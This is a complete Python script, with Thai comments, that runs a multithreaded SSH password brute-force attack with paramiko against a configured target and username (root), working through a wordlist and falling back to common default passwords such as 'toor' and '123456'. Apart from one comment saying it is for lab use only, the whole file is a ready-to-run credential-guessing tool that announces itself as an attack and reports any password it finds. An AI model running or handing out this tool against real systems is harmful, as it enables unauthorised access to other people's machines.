import paramiko
import threading
import queue
import time

# -------- CONFIG --------
TARGET_IP = '192.168.1.100'    # <---- ใส่ IP เป้าหมาย (Lab เท่านั้น!)
USERNAME = 'root'             # <---- ใส่ชื่อ user เป้าหมาย
WORDLIST_PATH = 'basic_wordlist.txt'  # <---- path ไปยังไฟล์ wordlist

THREADS = 10  # จำนวน thread ที่ใช้ (มากไปอาจเจอ block หรือช้าเพราะ network)
TIMEOUT = 3   # timeout ต่อครั้ง (วินาที)
# ------------------------


def try_ssh_login(password, result_queue):
    """ฟังก์ชันสำหรับพยายาม SSH ด้วย password ที่ให้มา"""
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(TARGET_IP, username=USERNAME, password=password, timeout=TIMEOUT, allow_agent=False, look_for_keys=False)
        # ถ้าเข้าได้ แสดงว่าเจอรหัสถูก
        result_queue.put(('FOUND', password))
        ssh.close()
        return True
    except paramiko.AuthenticationException:
        # รหัสผิด ไม่มีอะไรต้องแสดง
        pass
    except Exception:
        # อื่นๆ เช่น timeout, network error
        pass
    finally:
        try:
            ssh.close()
        except:
            pass
    return False


def worker(password_queue, result_queue, stop_event):
    """Thread worker ที่ดึงรหัสผ่านจาก queue แล้วลอง login"""
    while not stop_event.is_set():
        try:
            password = password_queue.get(timeout=1)
        except queue.Empty:
            continue
        
        if stop_event.is_set():
            password_queue.task_done()
            break
            
        try_ssh_login(password, result_queue)
        password_queue.task_done()


def main():
    print("[*] Starting SSH Brute Force Attack")
    print(f"[*] Target: {TARGET_IP}")
    print(f"[*] Username: {USERNAME}")
    print(f"[*] Wordlist: {WORDLIST_PATH}")
    print(f"[*] Threads: {THREADS}")
    print("-" * 50)
    
    # อ่านไฟล์ wordlist
    password_queue = queue.Queue(maxsize=500)
    result_queue = queue.Queue()
    stop_event = threading.Event()
    threads = []

    # เปิดไฟล์ wordlist แบบ lazy (ใช้ memory น้อยมาก)
    def wordlist_reader():
        try:
            with open(WORDLIST_PATH, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    yield line.strip()
        except FileNotFoundError:
            print(f"[-] Wordlist file not found: {WORDLIST_PATH}")
            # Create a basic wordlist for testing
            basic_passwords = ['password', 'admin', 'root', '123456', 'toor', 'pass']
            for pwd in basic_passwords:
                yield pwd

    # สร้าง threads
    for _ in range(THREADS):
        t = threading.Thread(target=worker, args=(password_queue, result_queue, stop_event))
        t.daemon = True
        t.start()
        threads.append(t)

    found = False
    total_tried = 0

    # วนลูปดึง password ใหม่เข้าคิวเรื่อยๆ (แบบประหยัดแรม)
    try:
        for password in wordlist_reader():
            if stop_event.is_set():
                break
                
            # ใส่ password เข้า queue
            password_queue.put(password)
            
            # ตรวจสอบผลลัพธ์
            try:
                while not result_queue.empty():
                    status, found_pass = result_queue.get_nowait()
                    if status == 'FOUND':
                        print(f"\n[+] Password FOUND: {found_pass}")
                        found = True
                        stop_event.set()
                        break
            except queue.Empty:
                pass
                
            if found:
                break
                
            total_tried += 1
            if total_tried % 100 == 0:
                print(f"[*] Tested {total_tried} passwords...")
                
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
        stop_event.set()

    # รอให้ queue ว่าง
    password_queue.join()

    # ตรวจสอบผลลัพธ์สุดท้าย
    while not result_queue.empty():
        try:
            status, found_pass = result_queue.get_nowait()
            if status == 'FOUND':
                print(f"\n[+] Password FOUND: {found_pass}")
                found = True
        except queue.Empty:
            pass

    if not found:
        print("[-] Password not found in wordlist.")

    # ปิด threads
    stop_event.set()
    for t in threads:
        t.join(timeout=1)

    print(f"[*] Total passwords tested: {total_tried}")
    print("[*] Attack completed.")


if __name__ == "__main__":
    main()
